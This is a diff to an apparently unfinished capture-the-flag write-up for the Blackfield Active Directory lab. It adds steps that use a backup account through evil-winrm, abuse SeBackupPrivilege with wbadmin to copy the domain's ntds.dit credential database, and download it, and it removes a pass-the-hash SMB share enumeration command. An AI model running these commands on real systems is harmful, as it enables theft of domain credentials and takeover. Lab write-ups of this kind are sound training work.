@@ -69,10 +69,24 @@
 
 <img width="815" height="773" alt="image" src="https://github.com/user-attachments/assets/8b778b24-fd1c-49a0-87c3-99a0556d4a3c" />
 
-10. Using svc_backup's hash to enumerate SMB shares again
+10. Svc_backup user can PSRemote into the machine, so we evil-winrm into the host and get the user flag!
 
-`nxc smb blackfield.local -u svc_backup -H svc_backup.ntlm_hash --shares`
 
-<img width="915" height="255" alt="image" src="https://github.com/user-attachments/assets/65799543-5744-4747-9fe4-24a660935b36" />
 
-11. 
+11. Once we remote in, we do basic enumeration and discover we have the SeBackupPrivilege.
+
+`whoami /priv`
+
+12. With wbadmin, we can backup and get a copy of any file on the machine, so we copy the ntds.dit file
+
+`wbadmin start backup -quiet -backuptarget:\\dc01\c$\Users\svc_backup\Desktop -include:C:\windows\ntds`
+
+`wbadmin get versions`
+
+`wbadmin start recovery -quiet -version:09/05/2025-15:31 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoveryTarget:c:\Users\svc_backup\Desktop -notRestoreAcl`
+
+13. Transfer ntds.dit file onto local machine
+
+`download ntds.dit`
+
+14. 
